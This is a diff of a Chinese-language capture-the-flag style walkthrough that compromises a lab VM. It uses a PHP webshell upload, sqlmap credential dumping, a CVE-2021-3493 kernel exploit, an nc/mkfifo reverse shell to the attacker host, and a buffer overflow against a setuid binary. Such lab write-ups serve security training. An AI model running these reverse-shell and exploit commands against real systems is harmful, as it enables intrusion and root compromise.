@@ -6,7 +6,7 @@
 sudo arp-scan 10.0.2.0/24
 ```
 
-![image-20211117175256383](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175256383.png)
+![image-20211117175256383](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175256383.png)
 
 ### 2.端口扫描
 
@@ -14,7 +14,7 @@ sudo arp-scan 10.0.2.0/24
 sudo nmap -p- 10.0.2.12
 ```
 
-![image-20211117175552751](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175552751.png)
+![image-20211117175552751](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175552751.png)
 
 结果显示目标开放了22,80,8000端口
 
@@ -24,7 +24,7 @@ sudo nmap -p- 10.0.2.12
 sudo nmap -sV -p22,80,8000 10.0.2.12
 ```
 
-![image-20211117175710597](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175710597.png)
+![image-20211117175710597](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175710597.png)
 
 22端口 SSH
 
@@ -32,73 +32,75 @@ sudo nmap -sV -p22,80,8000 10.0.2.12
 
 8000端口 BaseHTTPServer Python2.7.15(目标靶机支持Python环境)
 
-### 4.访问8000端口
+## 二、漏洞发现
 
-#### 4.1页面报错
+### 1.访问8000端口
 
-![image-20211117175907396](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175907396.png)
+#### 1.1页面报错
+
+![image-20211117175907396](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175907396.png)
 
 页面信息报错：服务器**不支持GET方法**
 
-#### 4.2尝试更改请求方法
+#### 1.2尝试更改请求方法
 
 抓包发送到Repeater
 
-![image-20211118091243343](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091243343.png)
+![image-20211118091243343](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091243343.png)
 
 分别更改为其他各种HTTP请求方法，分别提交
 
-![image-20211118091738052](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091738052.png)
+![image-20211118091738052](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091738052.png)
 
-![image-20211118091813470](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091813470.png)
+![image-20211118091813470](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091813470.png)
 
-![image-20211118091930161](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091930161.png)
+![image-20211118091930161](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091930161.png)
 
-![image-20211118092037650](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118092037650.png)
+![image-20211118092037650](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118092037650.png)
 
-![image-20211118092119731](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118092119731.png)
+![image-20211118092119731](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118092119731.png)
 
 在尝试诸多不同的请求方法后，返回的结果也是**报错失败**
 
-### 5.访问80端口
+### 2.访问80端口
 
-![image-20211117175818445](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175818445.png)
+![image-20211117175818445](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175818445.png)
 
-#### 5.1测试登录功能
+#### 2.1测试登录功能
 
 尝试进行登录
 
-![image-20211117180300696](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117180300696.png)
+![image-20211117180300696](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117180300696.png)
 
 发现登陆页面需要邮箱和密码，且**存在邮箱格式的校验**
 
-#### 5.2测试注册功能
+#### 2.2测试注册功能
 
 简单的注册一个账号
 
-![image-20211118102057359](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102057359.png)
+![image-20211118102057359](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102057359.png)
 
 注册完毕后自动跳转到 该用户登录后的页面
 
-![image-20211118102610231](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102610231.png)
+![image-20211118102610231](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102610231.png)
 
 对页面中的信息进行查看，发现名为admin的用户留言显示后台运行监视服务器的**python脚本**，名为**monitor.py**，在此也难免想起之前对端口服务扫描的时候，8000端口的名为BaseHTTPServer的服务和python环境，之后存在可利用的可能性
 
-![image-20211118102735643](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102735643.png)
+![image-20211118102735643](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102735643.png)
 
 继续对网站页面内的其他板块功能进行测试，在Profile页面内显示当前用户未提交--这里指的应该是留言/发帖
 
-![image-20211118103438523](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103438523.png)
+![image-20211118103438523](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103438523.png)
 
 简单提交一些信息
 
-![image-20211118103739734](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103739734.png)
+![image-20211118103739734](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103739734.png)
 
 发现Profile页面可以正常访问，且发现上传头像区，那是否也可尝试**文件上传**木马呢？
 
-![image-20211118103916272](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103916272.png)
+![image-20211118103916272](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103916272.png)
 
-#### 5.3测试页面
+#### 2.3测试页面
 
 ##### 文件上传
 
@@ -108,23 +110,23 @@ sudo nmap -sV -p22,80,8000 10.0.2.12
 vi aa.php
 ```
 
-![image-20211118104652005](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118104652005.png)
+![image-20211118104652005](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118104652005.png)
 
 没有对文件的后缀和内容进行过滤，此时头像虽未显示，但已经被替换为刚才上传的php文件
 
-![image-20211118104836716](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118104836716.png)
+![image-20211118104836716](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118104836716.png)
 
 复制头像的地址
 
-![image-20211118105035254](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118105035254.png)
+![image-20211118105035254](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118105035254.png)
 
 使用蚁剑连接
 
-![image-20211118105408035](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118105408035.png)
+![image-20211118105408035](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118105408035.png)
 
-![image-20211118145211734](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118145211734.png)
+![image-20211118145211734](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118145211734.png)
 
-![image-20211118145647280](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118145647280.png)
+![image-20211118145647280](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118145647280.png)
 
 成功拿到目标靶机的基本权限
 
@@ -134,21 +136,21 @@ vi aa.php
 
 最终发现在搜索栏内提交了单引号后
 
-![image-20211118150028569](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118150028569.png)
+![image-20211118150028569](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118150028569.png)
 
 页面显示后台数据库的报错信息，目标数据库应是MySQL数据库，使用SQLMAP进行测试
 
 ​	使用Burp抓取提交过程中的数据并将其复制至test文件
 
-![image-20211118150619413](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118150619413.png)
+![image-20211118150619413](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118150619413.png)
 
 ```
 sqlmap -r test -p query     #-p 指定参数
 ```
 
-![image-20211118151256012](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151256012.png)
+![image-20211118151256012](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151256012.png)
 
-![image-20211118151238752](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151238752.png)
+![image-20211118151238752](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151238752.png)
 
 确定存在SQL注入漏洞，接下来就可以进行信息的获取了
 
@@ -156,55 +158,55 @@ sqlmap -r test -p query     #-p 指定参数
 sqlmap -r test -p query --dbs
 ```
 
-![image-20211118151606121](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151606121.png)
+![image-20211118151606121](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151606121.png)
 
 ```
 sqlmap -r test -p query -D socialnetwork --tables
 ```
 
-![image-20211118151752362](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151752362.png)
+![image-20211118151752362](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151752362.png)
 
 ```
 sqlmap -r test -p query -D socialnetwork -T users --columns
 ```
 
-![image-20211118151941038](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151941038.png)
+![image-20211118151941038](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151941038.png)
 
 ```
 sqlmap -r test -p query -D socialnetwork -T users -C user_email,user_password --dump
 ```
 
-![image-20211118152315735](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152315735.png)
+![image-20211118152315735](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152315735.png)
 
 获得了admin账号的邮箱地址和密码，使用admin登录
 
-![image-20211118152420558](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152420558.png)
+![image-20211118152420558](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152420558.png)
 
-![image-20211118152513424](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152513424.png)
+![image-20211118152513424](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152513424.png)
 
 但是在admin账号内也未发现可利用的信息。
 
 
 
-### （时间yyds😄）
+## 三、提权
 
-#### CVE-2021-3493本地提权
+### CVE-2021-3493本地提权（时间提权术）
 
 再次回到蚁剑shell中
 
-![image-20211118153207728](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118153207728.png)
+![image-20211118153207728](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118153207728.png)
 
 目标内核4.15.0-38 操作系统Ubuntu版本为18.04.1 现在较新的版本18.04.5
 
 查询发现了较新的通用公共漏洞--
 
-![image-20211118154013454](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118154013454.png)
+![image-20211118154013454](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118154013454.png)
 
 思路：上传至目标靶机上，使用gcc编译后，本地执行
 
 使用蚁剑文件管理上传到目标靶机上
 
-![image-20211118155210947](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118155210947.png)
+![image-20211118155210947](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118155210947.png)
 
 使用gcc编译后才可执行
 
@@ -220,11 +222,11 @@ chmod +x exp
 ./exp
 ```
 
-![image-20211118155624865](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118155624865.png)
+![image-20211118155624865](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118155624865.png)
 
 似乎在蚁剑的shell内不能正常运行，尝试使用nc的shell
 
-![image-20211118160045951](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118160045951.png)
+![image-20211118160045951](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118160045951.png)
 
 不支持-e参数（可使用串联方法），这里为了拓展攻击方法的多样性，使用命令
 
@@ -234,7 +236,7 @@ kali:
 nc -nvlp 4444
 ```
 
-![image-20211122111610268](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122111610268.png)
+![image-20211122111610268](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122111610268.png)
 
 蚁剑shell:
 
@@ -250,13 +252,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.4 4444 >/tmp/f
 >
 >|/bin/sh -i 2>&1 将前面取出的内容作为输入，输入给 /bin/sh，再将bash的标准错误输出 也作为标准输入 （2 >&1）给bash 然后再将bash的输出，传给nc 远程，再将nc 传来的数据，写入 管道符 /tmp/f 。最后首尾接通了。
 
-![image-20211122112048252](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112048252.png)
+![image-20211122112048252](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112048252.png)
 
 执行后成功上线
 
-![image-20211122112120594](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112120594.png)
+![image-20211122112120594](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112120594.png)
 
-![image-20211122112256382](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112256382.png)
+![image-20211122112256382](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112256382.png)
 
 
 
@@ -264,15 +266,17 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.4 4444 >/tmp/f
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
 
-![image-20211122113004129](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122113004129.png)
+![image-20211122113004129](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122113004129.png)
 
 ```
 ./exp
 ```
 
-![image-20211122113224509](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122113224509.png)
+![image-20211122113224509](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122113224509.png)
 
 成功提权到root权限
+
+### 回到起点
 
 利用内核漏洞提权后，尝试其他方法
 
@@ -282,7 +286,9 @@ python -c "import pty; pty.spawn('/bin/bash')"
 exit
 ```
 
-![image-20211122114416703](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114416703.png)
+![image-20211122114416703](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114416703.png)
+
+
 
 回到普通权限后 搜集当前权限下有无可用信息
 
@@ -290,7 +296,7 @@ exit
 cat /etc/passwd
 ```
 
-![image-20211122114629491](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114629491.png)
+![image-20211122114629491](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114629491.png)
 
 发现用户socnet具有bash 权限，猜测其可能为主要管理账号
 
@@ -308,17 +314,17 @@ ls
 cd socnet
 ```
 
-![image-20211122114956833](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114956833.png)
+![image-20211122114956833](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114956833.png)
 
 发现了名为**monitor.py**的脚本，难免会想到之前在网站页面内admin用户的留言描述为后台运行的用来监视服务器的**python脚本**
 
-![image-20211118102735643](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102735643.png)
+![image-20211118102735643](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102735643-20220219102034629.png)
 
 ```
 ps aux | grep monitor
 ```
 
-![image-20211124093318091](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124093318091.png)
+![image-20211124093318091](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124093318091.png)
 
 查看进程发现monitor.py在运行 那么不妨查看一下该文件代码
 
@@ -385,9 +391,9 @@ cat monitor.py
 
 （https://docs.python.org/zh-cn/3/library/xmlrpc.html）
 
-![image-20211124094504425](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124094504425.png)
+![image-20211124094504425](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124094504425.png)
 
-![image-20211124095619187](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124095619187.png)
+![image-20211124095619187](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124095619187.png)
 
 结合monitor.py和示例客户端代码，进行调试
 
@@ -395,7 +401,7 @@ cat monitor.py
 vi a.py
 ```
 
-![image-20211124111612734](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124111612734.png)
+![image-20211124111612734](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124111612734.png)
 
 >import xmlrpc.client
 >
@@ -408,7 +414,7 @@ vi a.py
 python3 a.py
 ```
 
-![image-20211124105602436](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124105602436.png)
+![image-20211124105602436](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124105602436.png)
 
 成功打印出cpu信息
 
@@ -416,7 +422,7 @@ python3 a.py
 vi b.py
 ```
 
-![image-20211124112829598](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124112829598.png)
+![image-20211124112829598](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124112829598.png)
 
 >import xmlrpc.client
 >
@@ -438,7 +444,7 @@ vi b.py
 python3 b.py
 ```
 
-![image-20211124112719226](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124112719226.png)
+![image-20211124112719226](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124112719226.png)
 
 执行成功，passcode为1447
 
@@ -448,13 +454,13 @@ kali端：
 nc -nvlp 5555
 ```
 
-![image-20211124141525887](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141525887.png)
+![image-20211124141525887](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141525887.png)
 
 ```
 vi c.py
 ```
 
-![image-20211124141640107](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141640107.png)
+![image-20211124141640107](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141640107.png)
 
 >import xmlrpc.client
 >
@@ -467,13 +473,13 @@ vi c.py
 python3 c.py
 ```
 
-![image-20211124141913344](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141913344.png)
+![image-20211124141913344](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141913344.png)
 
 ```
 python -c "import pty;pty.spawn('/bin/bash')"           #优化shell
 ```
 
-![image-20211124142428803](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124142428803.png)
+![image-20211124142428803](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124142428803.png)
 
 查看socnet用户目录下的文件
 
@@ -481,7 +487,7 @@ python -c "import pty;pty.spawn('/bin/bash')"           #优化shell
 ls -l
 ```
 
-![image-20211124142732587](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124142732587.png)
+![image-20211124142732587](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124142732587.png)
 
 
 
@@ -491,7 +497,7 @@ ls -l
 file add_record
 ```
 
-![image-20211124143037766](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124143037766.png)
+![image-20211124143037766](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124143037766.png)
 
 发现该文件可执行且其属主账号为root
 
@@ -507,9 +513,9 @@ peda是基于python的动态调试脚本
 ./add_record
 ```
 
-![image-20211124145559990](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145559990.png)
+![image-20211124145559990](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145559990.png)
 
-![image-20211124145716660](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145716660.png)
+![image-20211124145716660](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145716660.png)
 
 简单测试了下该程序的各个功能
 
@@ -523,7 +529,7 @@ ls -l
 cat employee_records.txt
 ```
 
-![image-20211124145917807](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145917807.png)
+![image-20211124145917807](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145917807.png)
 
 针对每一个可以提交数据的点进行测试，测试是否存在内存溢出等问题
 
@@ -537,7 +543,7 @@ gdb -q ./add_record
 gdb-peda$ r
 ```
 
-![image-20211124151021962](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151021962.png)
+![image-20211124151021962](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151021962.png)
 
 生成500个A并复制粘贴测试
 
@@ -545,21 +551,21 @@ gdb-peda$ r
 python -c "print('A'*500)"
 ```
 
-![image-20211124151203410](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151203410.png)
+![image-20211124151203410](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151203410.png)
 
-![image-20211124151247420](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151247420.png)
+![image-20211124151247420](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151247420.png)
 
 程序正常退出了 没有产生异常溢出情况
 
 对剩下的输入点进行测试
 
-![image-20211124151456339](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151456339.png)
+![image-20211124151456339](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151456339.png)
 
-![image-20211124151545051](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151545051.png)
+![image-20211124151545051](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151545051.png)
 
-![image-20211124151631593](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151631593.png)
+![image-20211124151631593](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151631593.png)
 
-![image-20211124152138188](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124152138188.png)
+![image-20211124152138188](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124152138188.png)
 
 功夫不负有心人，在最后发现explain变量没有对内存做良好的限制导致溢出，这里重点关注寄存器EIP（EIP 寄存器里存储的是**CPU下次要执行的指令的地址**。）已经被填满，那就需要精确的知道寄存器EIP中的四个A的位置，若是知道就可以尝试在此位置执行payload
 
@@ -573,11 +579,11 @@ python -c "print('A'*500)"
 gdb-peda$ pattern create 100
 ```
 
-![image-20211124153203054](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153203054.png)
+![image-20211124153203054](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153203054.png)
 
 再将其输入至explain使其溢出
 
-![image-20211124153409310](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153409310.png)
+![image-20211124153409310](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153409310.png)
 
 可以直观的看到寄存器EIP位置内的数据为AHAA
 
@@ -587,7 +593,7 @@ gdb-peda$ pattern create 100
 gdb-peda$ pattern search
 ```
 
-![image-20211124153749453](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153749453.png)
+![image-20211124153749453](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153749453.png)
 
 得到寄存器EIP的偏移量位置为62，即从第63个字符开始就会进入寄存器EIP中
 
@@ -597,9 +603,9 @@ gdb-peda$ pattern search
 python -c "print('A'*62+'BCDE')"
 ```
 
-![image-20211124154441052](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124154441052.png)
+![image-20211124154441052](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124154441052.png)
 
-![image-20211124154528961](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124154528961.png)
+![image-20211124154528961](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124154528961.png)
 
 到此可以确定，已经可以精准的向寄存器EIP内写入
 
@@ -611,7 +617,7 @@ python -c "print('A'*62+'BCDE')"
 gdb-peda$ disas main
 ```
 
-![image-20211124162244701](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162244701.png)
+![image-20211124162244701](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162244701.png)
 
 调用了fopen可能是用于打开文件的 put输出内容 print显示
 
@@ -625,7 +631,7 @@ gdb-peda$ break * 0x0804873drd
 gdb-peda$ r
 ```
 
-![image-20211124162444002](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162444002.png)
+![image-20211124162444002](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162444002.png)
 
 添加断点后运行程序可以发现提前触及了断点
 
@@ -635,11 +641,11 @@ gdb-peda$ r
 gdb-peda$ s
 ```
 
-![image-20211124162836920](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162836920.png)
+![image-20211124162836920](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162836920.png)
 
 可以看到这里执行了程序的欢迎语，
 
-![image-20211124163004119](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124163004119.png)
+![image-20211124163004119](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124163004119.png)
 
 那么就可以确定在此开始程序的第一步
 
@@ -655,9 +661,9 @@ gdb-peda$ del 1  #删除断点
 gdb-peda$ break * 0x0804877b
 ```
 
-![image-20211124163823804](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124163823804.png)
+![image-20211124163823804](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124163823804.png)
 
-![image-20211124164219850](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124164219850.png)
+![image-20211124164219850](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124164219850.png)
 
 经过逐个的尝试 对该程序的程序逻辑有了更具体的了解
 
@@ -673,11 +679,11 @@ gdb-peda$ break * 0x0804877b
 
 在查看的过程中发现一则调用
 
-![image-20211124165222750](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124165222750.png)
+![image-20211124165222750](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124165222750.png)
 
 在0x08048834位置调用了vuln 首先这不是一个熟知的函数 其次函数名后没有@plt标识 又顾名思义难免联想到脆弱点等 猜测这是软件开发者自己写的函数
 
-![image-20211124165344555](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124165344555.png)
+![image-20211124165344555](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124165344555.png)
 
 查看当前程序中内嵌的函数
 
@@ -685,7 +691,7 @@ gdb-peda$ break * 0x0804877b
 gdb-peda$ info func
 ```
 
-![image-20211124170306580](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124170306580.png)
+![image-20211124170306580](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124170306580.png)
 
 发现setuid函数，结合之前ls -l查看add_record文件的权限和所属者是root的信息，猜测使用这个函数调用系统权限  看到的system函数是否可以执行操作系统指令呢？ backdoor "后门"？存在一系列疑问，也渐渐有了方向
 
@@ -695,17 +701,17 @@ gdb-peda$ info func
 gdb-peda$ disas vuln
 ```
 
-![image-20211124170831901](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124170831901.png)
+![image-20211124170831901](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124170831901.png)
 
 对strcpy函数进行搜索，该函数曾存在缓冲区溢出漏洞
 
-![image-20211124171130950](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124171130950.png)
+![image-20211124171130950](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124171130950.png)
 
 ```
 gdb-peda$ disas backdoor
 ```
 
-![image-20211124171814589](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124171814589.png)
+![image-20211124171814589](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124171814589.png)
 
 调用了setuid函数提权，调用了system函数执行指令，
 
@@ -727,7 +733,7 @@ python -c "import struct; print('zz\n1\n1\n1\n' + 'A'*62 + struct.pack('I', 0x08
 cat payload
 ```
 
-![image-20211124174848606](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124174848606.png)
+![image-20211124174848606](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124174848606.png)
 
 ```
 gdb-peda$ q     #退出调试器
@@ -739,7 +745,7 @@ gdb-peda$ q     #退出调试器
 。r b r
 ```
 
-![image-20211124175728595](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124175728595.png)
+![image-20211124175728595](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124175728595.png)
 
 ```
 gdb -q ./add_record    #重新打开gdb调试
@@ -749,7 +755,7 @@ gdb -q ./add_record    #重新打开gdb调试
 gdb-peda$ r < payload
 ```
 
-![image-20211124175923850](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124175923850.png)
+![image-20211124175923850](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124175923850.png)
 
